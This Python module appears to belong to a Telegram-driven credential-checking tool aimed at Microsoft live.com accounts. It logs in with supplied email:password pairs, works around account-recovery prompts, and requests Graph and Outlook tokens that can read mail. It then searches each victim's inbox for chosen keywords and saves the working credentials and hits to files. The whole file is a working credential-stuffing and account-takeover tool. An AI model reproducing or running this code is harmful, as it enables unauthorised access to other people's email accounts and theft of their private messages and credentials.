import os
import re
import sys
import time
import uuid
import random
import threading
import json
from urllib.parse import urlparse, parse_qs
import requests
import urllib3
from datetime import datetime
from config import user_stats, file_lock

# Disable warnings for clean terminal inside server
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 15
sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

def log_traffic(user, step_name, response, debug_file):
    """Logs traffic to the user's private debug file."""
    try:
        req_body = response.request.body
        if isinstance(req_body, bytes):
            req_body = req_body.decode('utf-8', 'ignore')
        
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "user": user,
            "step": step_name,
            "request": {
                "url": response.request.url, 
                "method": response.request.method, 
                "headers": dict(response.request.headers), 
                "body": req_body
            },
            "response": {
                "status_code": response.status_code, 
                "headers": dict(response.headers), 
                "cookies": response.cookies.get_dict(), 
                "body_preview": response.text[:1000]
            }
        }
        with file_lock:
            with open(debug_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(log_entry) + "\n")
    except: pass

def get_urlPost_sFTTag(session):
    maxretries = 3
    attempts = 0
    while attempts < maxretries:
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", 
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                'Accept-Language': 'en-US,en;q=0.9', 
                'Accept-Encoding': 'gzip, deflate, br', 
                'Connection': 'keep-alive', 
                'Upgrade-Insecure-Requests': '1'
            }
            text = session.get(sFTTag_url, headers=headers, timeout=TIMEOUT, verify=False).text
            
            match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                   re.search('value="(.+?)"', text, re.S) or \
                   re.search("sFTTag:'(.+?)'", text, re.S) or \
                   re.search('sFTTag:"(.+?)"', text, re.S) or \
                   re.search('name="PPFT".*?value="(.+?)"', text, re.S)
            
            if match:
                sFTTag = match.group(1)
                match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                       re.search("urlPost:'(.+?)'", text, re.S) or \
                       re.search('urlPost:"(.+?)"', text, re.S) or \
                       re.search('<form.*?action="(.+?)"', text, re.S)
                
                if match:
                    urlPost = match.group(1)
                    urlPost = urlPost.replace('&amp;', '&')
                    return urlPost, sFTTag
        except Exception:
            pass
        attempts += 1
        time.sleep(0.5)
    return None, None

def get_graph_token(session):
    try:
        client_id = '0000000048170EF2'
        scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
        auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
        r = session.get(auth_url, timeout=TIMEOUT, verify=False)
        token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        if not token:
            scope = 'https://graph.microsoft.com/Mail.Read'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = session.get(auth_url, timeout=TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        return token
    except:
        return None

def get_access_token_for_outlook(session):
    try:
        session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
        scope = 'https://substrate.office.com/User-Internal.ReadWrite'
        client_id = '0000000048170EF2'
        auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
        r = session.get(auth_url, timeout=TIMEOUT, verify=False)
        token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        if not token:
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = session.get(auth_url, timeout=TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        return token
    except:
        return None

def check_inbox_via_graph(session, keywords, user_id):
    token = get_graph_token(session)
    if not token:
        return 0, []
    found_info = []
    total_found_sum = 0
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
    
    for keyword in keywords:
        try:
            query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
            r = session.get(query, headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                total = data.get('@odata.count', len(data.get('value', [])))
                if total > 0:
                    total_found_sum += total
                    found_info.append(f"{keyword}:[{total}]")
                    with file_lock:
                        user_stats[user_id]["detailed_hits"][keyword] = user_stats[user_id]["detailed_hits"].get(keyword, 0) + 1
                    try:
                        query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject&$top=25"
                        r2 = session.get(query2, headers=headers, timeout=10, verify=False)
                        if r2.status_code == 200:
                            data2 = r2.json()
                            total2 = data2.get('@odata.count', len(data2.get('value', [])))
                            if total2 > 0:
                                total_found_sum += total2
                                found_info.append(f"{keyword}(body):[{total2}]")
                    except:
                        pass
        except:
            pass
    return total_found_sum, found_info

def check_inbox_substrate(session, email, keywords, user_id):
    total_found, found_info = check_inbox_via_graph(session, keywords, user_id)
    if total_found > 0:
        return total_found, found_info
        
    token = get_access_token_for_outlook(session)
    if not token:
        return 0, []
    
    cid = session.cookies.get('MSPCID', email)
    headers = {
        'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}',
        'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0',
        'Accept': 'application/json', 'Host': 'substrate.office.com'
    }
    found_info = []
    total_found_sum = 0
    url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
    
    for keyword in keywords:
        try:
            payload = {
                'Cvid': str(uuid.uuid4()), 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off',
                'EntityRequests': [{
                    'EntityType': 'Conversation', 'ContentSources': ['Exchange'],
                    'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                    'From': 0, 'Query': {'QueryString': keyword}, 'Size': 25, 'EnableTopResults': True, 'TopResultsCount': 3
                }],
                'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
            }
            r = session.post(url, json=payload, headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                total = 0
                if 'EntitySets' in data:
                    for entity_set in data['EntitySets']:
                        if 'ResultSets' in entity_set:
                            for result_set in entity_set['ResultSets']:
                                if 'Total' in result_set: total = result_set['Total']
                                elif 'ResultCount' in result_set: total = result_set['ResultCount']
                                elif 'Results' in result_set: total = len(result_set['Results'])
                if total > 0:
                    total_found_sum += total
                    found_info.append(f"{keyword}:[{total}]")
                    with file_lock:
                        user_stats[user_id]["detailed_hits"][keyword] = user_stats[user_id]["detailed_hits"].get(keyword, 0) + 1
        except:
            pass
    return total_found_sum, found_info

def check_account(credential, keywords, user_id=None, user_paths=None):
    """
    Checks a single account using the requested live.com login API flow.
    Integrates smoothly with main.py Telegram dashboard.
    """
    try:
        parts = credential.strip().split(':')
        if len(parts) < 2:
            if user_id in user_stats:
                with file_lock:
                    user_stats[user_id]["invalid"] += 1
                    user_stats[user_id]["checked"] += 1
            return
        email, password = parts[0], parts[1]
    except:
        if user_id in user_stats:
            with file_lock:
                user_stats[user_id]["invalid"] += 1
                user_stats[user_id]["checked"] += 1
        return

    session = requests.Session()
    urlPost, sFTTag = get_urlPost_sFTTag(session)
    
    if not urlPost or not sFTTag:
        if user_id in user_stats:
            with file_lock:
                user_stats[user_id]["invalid"] += 1
                user_stats[user_id]["checked"] += 1
        return

    maxretries = 1
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded', 
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                'Accept-Language': 'en-US,en;q=0.9', 
                'Accept-Encoding': 'gzip, deflate, br', 
                'Connection': 'close'
            }
            
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=TIMEOUT, verify=False)
            
            if user_paths:
                log_traffic(email, "Login_POST", login_request, user_paths["debug"])

            is_valid = False
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None': is_valid = True
            elif 'cancel?mkt=' in login_request.text:
                try:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                    if ipt and pprid and uaid:
                        data_cancel = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                        if action:
                            ret = session.post(action.group(), data=data_cancel, allow_redirects=True, timeout=TIMEOUT, verify=False)
                            return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if return_url:
                                fin = session.get(return_url.group(), allow_redirects=True, timeout=TIMEOUT, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                if token != 'None': is_valid = True
                except: pass

            if is_valid:
                total, hits = check_inbox_substrate(session, email, keywords, user_id)
                
                with file_lock:
                    user_stats[user_id]["checked"] += 1
                
                if hits:
                    final_line = f"{email}:{password} | " + " | ".join(hits)
                    with file_lock:
                        user_stats[user_id]["keywords_good"] += 1
                        with open(user_paths["hits"], "a", encoding="utf-8") as f:
                            f.write(final_line + "\n")
                else:
                    with file_lock:
                        user_stats[user_id]["good"] += 1
                        with open(user_paths["hits_no_kw"], "a", encoding="utf-8") as f:
                            f.write(f"{email}:{password}\n")
                return 

            if any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                with file_lock:
                    user_stats[user_id]["invalid"] += 1  # Standardizing 2FA/Blocks as invalid for stats board
                    user_stats[user_id]["checked"] += 1
                return
                
            if any(value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', "tried to sign in too many times with an incorrect account or password", 'help us protect your account']):
                with file_lock:
                    user_stats[user_id]["invalid"] += 1
                    user_stats[user_id]["checked"] += 1
                return
                
        except Exception:
            pass
        tries += 1
        if user_id in user_stats:
            with file_lock:
                user_stats[user_id]["retries"] += 1
        time.sleep(0.5)

    if user_id in user_stats:
        with file_lock:
            user_stats[user_id]["errors"] += 1
            user_stats[user_id]["checked"] += 1